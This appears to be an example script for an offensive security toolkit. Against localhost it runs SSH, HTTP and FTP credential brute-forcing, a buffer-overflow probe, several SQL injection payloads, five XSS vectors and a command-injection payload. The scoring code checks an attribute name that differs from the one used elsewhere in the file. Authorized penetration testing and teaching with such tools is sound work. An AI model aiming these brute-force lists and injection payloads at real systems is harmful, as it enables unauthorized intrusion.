"""
Attacker Examples

Demonstrates how to use the offensive security testing modules.
WARNING: This module is for authorized security testing only.
"""

import asyncio
import time
from typing import Dict, Any

# Import attacker modules
from ..attackers import (
    # Brute Forcers
    SSHBruteForceRequest, perform_ssh_brute_force_async,
    HTTPBruteForceRequest, perform_http_brute_force_async,
    FTPBruteForceRequest, perform_ftp_brute_force_async,
    
    # Exploiters
    BufferOverflowRequest, perform_buffer_overflow_test_async,
    SQLInjectionExploitRequest, perform_sql_injection_exploit_async,
    XSSExploitRequest, perform_xss_exploit_async,
    CommandInjectionRequest, perform_command_injection_exploit_async
)

async def run_brute_force_examples() -> Dict[str, Any]:
    """Run brute force attack examples."""
    print("🔓 Running Brute Force Attack Examples...")
    
    results = {}
    
    # 1. SSH brute force attack
    print("1. Testing SSH Brute Force Attack...")
    ssh_request = SSHBruteForceRequest(
        target_host="localhost",  # Use localhost for testing
        target_port=22,
        username_list=["admin", "root", "test"],
        password_list=["password", "123456", "admin"],
        max_concurrent_attempts=2,
        timeout=5.0,
        delay_between_attempts=1.0
    )
    ssh_result = await perform_ssh_brute_force_async(ssh_request)
    results["ssh_brute_force"] = ssh_result
    print(f"   SSH brute force completed: {len(ssh_result.successful_credentials)} successful")
    print(f"   Total attempts: {ssh_result.total_attempts}")
    
    # 2. HTTP brute force attack
    print("2. Testing HTTP Brute Force Attack...")
    http_request = HTTPBruteForceRequest(
        target_url="http://localhost:8080",
        username_list=["admin", "user"],
        password_list=["password", "admin"],
        auth_type="basic",
        max_concurrent_attempts=5,
        timeout=5.0,
        delay_between_attempts=0.5
    )
    http_result = await perform_http_brute_force_async(http_request)
    results["http_brute_force"] = http_result
    print(f"   HTTP brute force completed: {len(http_result.successful_credentials)} successful")
    print(f"   Total attempts: {http_result.total_attempts}")
    
    # 3. FTP brute force attack
    print("3. Testing FTP Brute Force Attack...")
    ftp_request = FTPBruteForceRequest(
        target_host="localhost",
        target_port=21,
        username_list=["admin", "ftp"],
        password_list=["password", "ftp"],
        max_concurrent_attempts=3,
        timeout=5.0,
        delay_between_attempts=1.0
    )
    ftp_result = await perform_ftp_brute_force_async(ftp_request)
    results["ftp_brute_force"] = ftp_result
    print(f"   FTP brute force completed: {len(ftp_result.successful_credentials)} successful")
    print(f"   Total attempts: {ftp_result.total_attempts}")
    
    return results

async def run_exploit_examples() -> Dict[str, Any]:
    """Run exploit development examples."""
    print("💥 Running Exploit Development Examples...")
    
    results = {}
    
    # 1. Buffer overflow exploit
    print("1. Testing Buffer Overflow Exploit...")
    buffer_request = BufferOverflowRequest(
        target_host="localhost",
        target_port=9999,
        buffer_size=1024,
        shellcode="\\x90\\x90\\x90",  # NOP sled
        timeout=5.0
    )
    buffer_result = await perform_buffer_overflow_test_async(buffer_request)
    results["buffer_overflow"] = buffer_result
    print(f"   Buffer overflow test completed: {buffer_result.is_successful}")
    print(f"   Crash detected: {buffer_result.crash_detected}")
    
    # 2. SQL injection exploit
    print("2. Testing SQL Injection Exploit...")
    sql_request = SQLInjectionExploitRequest(
        target_url="http://localhost:8080/vulnerable.php",
        parameter="id",
        injection_type="union",
        payload="' UNION SELECT 1,2,3--",
        timeout=5.0
    )
    sql_result = await perform_sql_injection_exploit_async(sql_request)
    results["sql_injection"] = sql_result
    print(f"   SQL injection exploit completed: {sql_result.is_successful}")
    print(f"   Injection type: {sql_result.injection_type}")
    
    # 3. XSS exploit
    print("3. Testing XSS Exploit...")
    xss_request = XSSExploitRequest(
        target_url="http://localhost:8080/vulnerable.php",
        parameter="search",
        payload="<script>alert('XSS')</script>",
        xss_type="reflected",
        timeout=5.0
    )
    xss_result = await perform_xss_exploit_async(xss_request)
    results["xss_exploit"] = xss_result
    print(f"   XSS exploit completed: {xss_result.is_successful}")
    print(f"   Payload reflected: {xss_result.payload_reflected}")
    
    # 4. Command injection exploit
    print("4. Testing Command Injection Exploit...")
    cmd_request = CommandInjectionRequest(
        target_url="http://localhost:8080/vulnerable.php",
        parameter="cmd",
        payload="ls -la",
        injection_operator=";",
        timeout=5.0
    )
    cmd_result = await perform_command_injection_exploit_async(cmd_request)
    results["command_injection"] = cmd_result
    print(f"   Command injection exploit completed: {cmd_result.is_successful}")
    print(f"   Injection operator: {cmd_result.injection_operator}")
    
    return results

async def run_integrated_attack_examples() -> Dict[str, Any]:
    """Run integrated attack examples combining multiple attack types."""
    print("⚔️ Running Integrated Attack Examples...")
    
    results = {}
    
    # Target for comprehensive attack assessment
    target_host = "localhost"
    target_url = "http://localhost:8080"
    
    print(f"Performing comprehensive attack assessment on {target_host}")
    
    # Run all attack types concurrently
    brute_results, exploit_results = await asyncio.gather(
        run_brute_force_examples(),
        run_exploit_examples(),
        return_exceptions=True
    )
    
    # Compile comprehensive attack report
    comprehensive_report = {
        "target_host": target_host,
        "target_url": target_url,
        "attack_timestamp": time.time(),
        "brute_force_results": brute_results if not isinstance(brute_results, Exception) else {"error": str(brute_results)},
        "exploit_results": exploit_results if not isinstance(exploit_results, Exception) else {"error": str(exploit_results)},
        "overall_attack_assessment": {
            "brute_force_success": "LOW",  # Default, would be calculated from results
            "exploit_success": "LOW",  # Default, would be calculated from results
            "overall_success": "LOW"
        }
    }
    
    # Calculate overall attack success (simplified)
    attack_scores = []
    
    if not isinstance(brute_results, Exception):
        ssh_brute = brute_results.get("ssh_brute_force", {})
        if hasattr(ssh_brute, 'successful_attempts'):
            attack_scores.append(1 if ssh_brute.successful_attempts > 0 else 0)
        
        http_brute = brute_results.get("http_brute_force", {})
        if hasattr(http_brute, 'successful_attempts'):
            attack_scores.append(1 if http_brute.successful_attempts > 0 else 0)
    
    if not isinstance(exploit_results, Exception):
        sql_exploit = exploit_results.get("sql_injection", {})
        if hasattr(sql_exploit, 'is_successful'):
            attack_scores.append(2 if sql_exploit.is_successful else 0)
        
        xss_exploit = exploit_results.get("xss_exploit", {})
        if hasattr(xss_exploit, 'is_successful'):
            attack_scores.append(1 if xss_exploit.is_successful else 0)
    
    if attack_scores:
        avg_success = sum(attack_scores) / len(attack_scores)
        if avg_success > 1.5:
            comprehensive_report["overall_attack_assessment"]["overall_success"] = "HIGH"
        elif avg_success > 0.5:
            comprehensive_report["overall_attack_assessment"]["overall_success"] = "MEDIUM"
    
    results["comprehensive_attack"] = comprehensive_report
    print(f"   Comprehensive attack assessment completed: {comprehensive_report['overall_attack_assessment']['overall_success']} success rate")
    
    return results

async def run_advanced_attack_examples() -> Dict[str, Any]:
    """Run advanced attack examples with custom configurations."""
    print("🚀 Running Advanced Attack Examples...")
    
    results = {}
    
    # 1. Custom SSH brute force with large wordlist
    print("1. Testing Custom SSH Brute Force...")
    custom_ssh_request = SSHBruteForceRequest(
        target_host="localhost",
        target_port=22,
        username_list=[
            "admin", "administrator", "root", "user", "guest", "test",
            "ubuntu", "debian", "centos", "fedora", "redhat"
        ],
        password_list=[
            "password", "123456", "admin", "root", "test", "guest",
            "password123", "admin123", "root123", "test123"
        ],
        max_concurrent_attempts=5,
        timeout=10.0,
        delay_between_attempts=1.0
    )
    custom_ssh_result = await perform_ssh_brute_force_async(custom_ssh_request)
    results["custom_ssh_brute_force"] = custom_ssh_result
    print(f"   Custom SSH brute force completed: {len(custom_ssh_result.successful_credentials)} successful")
    
    # 2. Advanced SQL injection with multiple techniques
    print("2. Testing Advanced SQL Injection...")
    sql_techniques = [
        ("union", "' UNION SELECT 1,2,3--"),
        ("boolean", "' AND 1=1--"),
        ("time", "'; WAITFOR DELAY '00:00:05'--"),
        ("error", "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--")
    ]
    
    sql_results = {}
    for technique, payload in sql_techniques:
        sql_request = SQLInjectionExploitRequest(
            target_url="http://localhost:8080/vulnerable.php",
            parameter="id",
            injection_type=technique,
            payload=payload,
            timeout=10.0
        )
        sql_result = await perform_sql_injection_exploit_async(sql_request)
        sql_results[technique] = sql_result
        print(f"   {technique.upper()} SQL injection: {sql_result.is_successful}")
    
    results["advanced_sql_injection"] = sql_results
    
    # 3. Multi-vector XSS attack
    print("3. Testing Multi-Vector XSS Attack...")
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>"
    ]
    
    xss_results = {}
    for i, payload in enumerate(xss_payloads):
        xss_request = XSSExploitRequest(
            target_url="http://localhost:8080/vulnerable.php",
            parameter="search",
            payload=payload,
            xss_type="reflected",
            timeout=5.0
        )
        xss_result = await perform_xss_exploit_async(xss_request)
        xss_results[f"payload_{i+1}"] = xss_result
        print(f"   XSS payload {i+1}: {xss_result.is_successful}")
    
    results["multi_vector_xss"] = xss_results
    
    return results

async def main():
    """Main function to run all attacker examples."""
    print("⚔️ Cybersecurity Attacker Toolkit Examples")
    print("=" * 60)
    print("⚠️  WARNING: This module is for authorized security testing only!")
    print("=" * 60)
    
    try:
        # Run individual attacker examples
        print("\n🔓 Brute Force Attack Examples")
        print("-" * 30)
        brute_results = await run_brute_force_examples()
        
        print("\n💥 Exploit Development Examples")
        print("-" * 30)
        exploit_results = await run_exploit_examples()
        
        print("\n⚔️ Integrated Attack Examples")
        print("-" * 30)
        integrated_results = await run_integrated_attack_examples()
        
        print("\n🚀 Advanced Attack Examples")
        print("-" * 30)
        advanced_results = await run_advanced_attack_examples()
        
        print("\n" + "=" * 60)
        print("✅ All attacker examples completed successfully!")
        
        # Summary
        print("\n📊 Attacker Summary:")
        print(f"   Brute force attacks: {len(brute_results)} completed")
        print(f"   Exploit development: {len(exploit_results)} completed")
        print(f"   Integrated attacks: {len(integrated_results)} completed")
        print(f"   Advanced attacks: {len(advanced_results)} completed")
        
        # Security summary
        if "comprehensive_attack" in integrated_results:
            overall_success = integrated_results["comprehensive_attack"]["overall_attack_assessment"]["overall_success"]
            print(f"   Overall attack success rate: {overall_success}")
        
        print("\n🔒 Remember: Only use these tools for authorized security testing!")
        
    except Exception as e:
        print(f"❌ Error running attacker examples: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main()) 